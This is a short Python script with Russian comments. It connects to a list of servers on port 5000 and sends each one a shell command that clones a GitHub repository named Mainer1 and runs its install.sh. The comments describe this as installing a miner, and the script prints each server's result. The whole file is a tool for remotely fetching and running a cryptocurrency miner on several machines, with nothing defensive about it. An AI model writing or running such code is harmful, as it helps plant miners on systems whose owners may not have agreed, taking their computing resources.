import socket

# Список серверов
servers = ["server1", "server2", "server3"]

for server in servers:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server, 5000))

    # Команда для установки майнера
    command = "git clone https://github.com/Bravno/Mainer1 /opt/mainer1 && cd /opt/mainer1 && bash install.sh"
    client_socket.send(command.encode())

    # Получение результата выполнения команды
    output = client_socket.recv(4096).decode()
    print(f"Результат от {server}:\n{output}")

    client_socket.close()
